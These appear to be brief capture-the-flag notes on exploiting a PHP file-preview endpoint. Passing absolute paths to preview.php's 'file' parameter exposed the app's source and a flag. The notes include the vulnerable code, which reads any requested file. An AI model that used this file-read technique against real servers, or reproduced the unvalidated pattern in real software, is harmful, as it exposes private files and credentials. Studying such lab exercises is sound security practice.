Annual Review

AWS server
serving files
  -preview.php
    network request file=/var/www/html/guide.md
  -app.php
  -index.php

Are trying to find what the file hierarchy is.
running gobuster didn't work can't ping

requested /preview.php?file=/var/www/html/preview.php got this:
```php
<?php
  require_once('libs/utils.php');

  if (!is_auth())
    redirect('index.php');

  $file = $_GET['file'];
  if (isset($file)) {
    header("Content-Type: text/plain");
    echo get_file($file);
  }
?>
```
previewed libs/utils.php which mentionned libs/dynamo.php
The flag was inside of there: flag-d19650aa911acb7c130aa380601d169d3bd08ab4